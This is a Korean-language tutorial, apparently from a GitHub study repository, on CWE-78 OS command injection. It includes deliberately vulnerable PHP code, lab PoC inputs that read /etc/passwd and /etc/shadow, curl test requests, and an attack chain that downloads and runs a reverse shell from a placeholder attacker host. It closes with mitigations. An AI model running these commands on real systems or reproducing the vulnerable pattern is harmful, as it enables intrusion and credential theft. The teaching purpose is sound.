# CWE-78: OS Command Injection

사용자 입력을 검증 없이 시스템 셸 명령에 전달하여 공격자가 임의 OS 명령을 실행할 수 있는 취약점입니다.

## 목차

| 섹션                                                                                                 |
|------------------------------------------------------------------------------------------------------|
| [1. 개요](#1-개요) / [2. 원리](#2-원리) / [3. PoC](#3-poc) / [4. 영향](#4-영향) / [5. 대응](#5-대응) |

---

## 1. 개요

| 항목      | 내용                                                              |
|-----------|-------------------------------------------------------------------|
| CWE ID    | CWE-78                                                            |
| 이름      | Improper Neutralization of Special Elements used in an OS Command |
| OWASP     | A03:2021 Injection                                                |
| 영향      | RCE (Remote Code Execution)                                       |
| 빈도      | 높음 — PHP, Python, Node.js 웹 앱에서 자주 발견                   |
| 전제 조건 | 사용자 입력이 셸 명령에 도달 + 위험 함수 활성화                   |

[⬆ 목차로 돌아가기](#목차)

---

## 2. 원리

### 취약 코드 (PHP)

```php
<?php
// 사용자 입력을 직접 셸에 전달 — 취약
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);
echo "<pre>$output</pre>";
?>
```

### 발생 조건

| 조건                     | 설명                                                             |
|--------------------------|------------------------------------------------------------------|
| 위험 함수 활성화         | `shell_exec`, `system`, `exec`, `passthru`, `popen`, `proc_open` |
| 입력 검증 없음           | 사용자 입력이 그대로 명령어 문자열에 삽입                        |
| disable_functions 미설정 | php.ini에서 위험 함수를 차단하지 않음                            |

### 공격 원리

```
정상 의도: ping 192.0.2.1
공격 입력: 192.0.2.1; cat /etc/passwd
실행 결과: ping 192.0.2.1; cat /etc/passwd
                            ^^^^^^^^^^^^^^^^^^
                            공격자가 주입한 명령
```

셸 메타문자: `;`, `|`, `&&`, `||`, `` ` ``, `$()` 로 명령 체이닝이 가능합니다.

[⬆ 목차로 돌아가기](#목차)

---

## 3. PoC

### 실습 URL

```
http://10.200.101.182/cmd_exec.php
```

### 테스트 입력

| 입력                             | 목적                              | 예상 결과                       |
|----------------------------------|-----------------------------------|---------------------------------|
| `id`                             | 현재 사용자 확인                  | `uid=48(apache) gid=48(apache)` |
| `cat /etc/passwd`                | 시스템 계정 목록                  | root:x:0:0:...                  |
| `uname -a`                       | 커널 정보                         | Linux rocky10 6.x.x ...         |
| `find / -perm -4000 2>/dev/null` | SUID 바이너리 탐색                | /usr/bin/sudo 등                |
| `ls -la /var/www/html/`          | 웹 루트 파일 목록                 | 777 권한 확인                   |
| `cat /etc/shadow`                | shadow 파일 (권한 따라 실패 가능) | 해시 또는 Permission denied     |
| `whoami && hostname && ip addr`  | 복합 명령                         | 사용자, 호스트명, IP            |

### cURL 테스트

```bash
# GET 방식
curl "http://10.200.101.182/cmd_exec.php?cmd=id"

# POST 방식
curl -X POST -d "cmd=cat /etc/passwd" http://10.200.101.182/cmd_exec.php
```

[⬆ 목차로 돌아가기](#목차)

---

## 4. 영향

| 영향        | 설명                                        |
|-------------|---------------------------------------------|
| 정보 유출   | /etc/passwd, /etc/shadow, DB 설정 파일 읽기 |
| 서버 장악   | 리버스 셸, 백도어 설치, cron 등록           |
| 내부 침투   | 내부 네트워크 스캔, 다른 서버 공격          |
| 데이터 파괴 | rm -rf, DB drop, 랜섬웨어 설치              |
| 권한 상승   | SUID 바이너리 악용 → root 획득              |

### 공격 체인 예시

```
1. cmd_exec.php?cmd=id                          → apache 권한 확인
2. cmd_exec.php?cmd=find / -perm -4000          → SUID 파일 탐색
3. cmd_exec.php?cmd=curl http://attacker/shell   → 리버스 셸 다운로드
4. cmd_exec.php?cmd=chmod +x /tmp/shell && /tmp/shell  → 실행
5. 리버스 셸에서 권한 상승 시도
```

[⬆ 목차로 돌아가기](#목차)

---

## 5. 대응

### php.ini 설정

```ini
; 위험 함수 비활성화 (가장 효과적)
disable_functions = shell_exec,system,exec,passthru,popen,proc_open,pcntl_exec
```

### 코드 수준 대응

```php
<?php
// 대응 1: 화이트리스트 방식
$allowed = ['ls', 'df', 'uptime'];
$cmd = $_GET['cmd'];
if (!in_array($cmd, $allowed)) {
    die("허용되지 않은 명령어");
}

// 대응 2: escapeshellarg() / escapeshellcmd()
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 3 $host");

// 대응 3: 셸 호출 자체를 피하기
// shell_exec("ls $dir") 대신:
$files = scandir($dir);
?>
```

### WAF 규칙 (ModSecurity 예시)

```
SecRule ARGS "@rx [;|`$()]" "id:1001,deny,status:403,msg:'Command Injection attempt'"
```

### 서버 설정

| 대응              | 방법                                   |
|-------------------|----------------------------------------|
| SELinux enforcing | `setsebool -P httpd_execmem off`       |
| 최소 권한         | apache 사용자로 실행, sudo 없음        |
| chroot            | httpd를 /var/www 내로 격리             |
| AppArmor/SELinux  | httpd 프로세스 실행 가능 바이너리 제한 |

[⬆ 목차로 돌아가기](#목차)

---

## 참고 자료

- CWE-78: [cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html) — ★★★☆☆
- OWASP Command Injection: [owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection) — ★★★☆☆

---

## 통계

![GitHub stars](https://img.shields.io/github/stars/siasia86/system-engineering-resources?style=social)
![GitHub forks](https://img.shields.io/github/forks/siasia86/system-engineering-resources?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/siasia86/system-engineering-resources?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/siasia86/system-engineering-resources)
![License](https://img.shields.io/github/license/siasia86/system-engineering-resources)
![Actions](https://img.shields.io/github/actions/workflow/status/siasia86/system-engineering-resources/update-date.yml)

---

**작성일**: 2026-07-02

**마지막 업데이트**: 2026-07-02

© 2026 siasia86. Licensed under CC BY 4.0.
